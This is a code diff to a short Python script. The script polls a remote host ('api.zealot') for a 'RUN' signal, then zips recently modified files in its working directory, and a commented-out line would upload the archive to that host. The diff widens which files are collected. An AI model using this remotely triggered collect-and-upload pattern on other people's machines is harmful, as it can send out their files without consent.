@@ -12,7 +12,6 @@ response = requests.get('http://api.zealot/collect/')
 
 changedFiles = [] # list of file pathes changed in last x minutes
 path = os.path.dirname(os.path.realpath(__file__)) # get current path
-noHome = (path + "/home") # to prevent including "~/current/path/home"
 
 while response.text != "RUN":
     print ("Flag is set to '%s'" % (response)) # debug print
@@ -32,7 +31,7 @@ print ("Executing...")    #for demonstration
 # print ("Flag set to '%s' at: %s" % (response, datetime.datetime.now()), file=open("zealotlog.txt", "a"))
 
 # create list of all files in directory
-lstFiles = glob.glob(path + '/*', recursive=True)
+lstFiles = glob.glob('*', recursive=True)
 
 #print (lstFiles) # DEBUG
 
@@ -42,8 +41,7 @@ lstFiles = glob.glob(path + '/*', recursive=True)
 for i in lstFiles:
     fileStat = os.stat(i)
     if (time.time() - fileStat.st_mtime < 300.00):
-        if (i is not noHome):
-            changedFiles.append(i)
+        changedFiles.append(i)
 
 #print (changedFiles) # DEBUG
 
@@ -53,6 +51,6 @@ with zipfile.ZipFile('changed.zip', 'w') as zipChanged:
         zipChanged.write(f)
 
 # send zip files to server
-#zipFile = {'file': open(path + '/changed.zip', 'rb')}
+#zipFile = {'file': open(path + '/changed.zip', 'rb')} # MAY NEED ADJUSTING
 #send = requests.post('http://api.zealot/<endpoint_for_receipt', files=zipFile)
 #send.text
